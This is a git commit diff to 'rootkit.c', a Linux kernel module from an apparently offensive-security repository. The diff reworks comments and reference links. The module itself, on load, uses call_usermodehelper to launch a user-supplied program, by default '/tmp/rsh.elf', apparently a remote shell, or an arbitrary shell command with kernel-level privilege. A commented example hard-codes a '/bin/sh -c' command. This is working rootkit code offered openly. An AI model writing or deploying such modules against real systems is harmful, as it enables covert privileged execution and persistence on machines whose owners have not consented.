1be7b079a9753b0995fb67ef4c2b930def049485
William Martens <68499986+loneicewolf@users.noreply.github.com>
2023-01-27 18:53:17 +0100

    Update rootkit.c

--- rootkit.c
+++ rootkit.c
@@ -1,8 +1,14 @@
-/* https://github.com/loneicewolf/EXEC_LKM
+/* GitHub*
+ * https://github.com/loneicewolf/EXEC_LKM
+ * Kernel.org*
  * https://www.kernel.org/doc/htmldocs/kernel-api/API-call-usermodehelper.html
  * https://www.kernel.org/doc/htmldocs/kernel-api/API-call-usermodehelper-setup.html
  * https://www.kernel.org/doc/htmldocs/kernel-api/API-call-usermodehelper-exec.html
- * 
+ * *External sites
+ * https://developer.ibm.com/articles/l-user-space-apps/
+ * https://gta.ufrj.br/ensino/eel878/sockets/
+ * Stack*Sites
+ * https://stackoverflow.com/q/17803517/14346786
  */
 
 #include <linux/init.h>
@@ -23,22 +29,17 @@ module_init(rk_init);
 module_exit(rk_exit);
 
 static char *app = "/tmp/rsh.elf"; // default application; see rsh.c
-module_param(app, charp, S_IRUGO); /* allows input of the value for app 
-                                    * this can be a command too */
+module_param(app, charp, S_IRUGO); // allows input of the value for app (this can be a command too)
 
 static int __init rk_init(void){
     printk("[+]LKM loaded");
-    
     char *argv[] = {app,NULL};
-    
-    // we can also use a hard coded command
-    
     /* 
+    * we can also use a hard coded command (described below)
     * (NOTE if you do, comment out the above line (char *argv...)
-    * and un-comment the crappy "oneliner" below
+    * and un-comment the below line
     * char *argv[] = {"/bin/sh","-c","ps >> /tmp/W",NULL};
     */
-    
     static char *env[] = {"HOME=/","TERM=linux","PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
     call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC);
     return 0;
@@ -47,5 +48,3 @@ static int __init rk_init(void){
 static void __exit rk_exit(void){
 	printk("[-]LKM unloaed");
 }
-
-
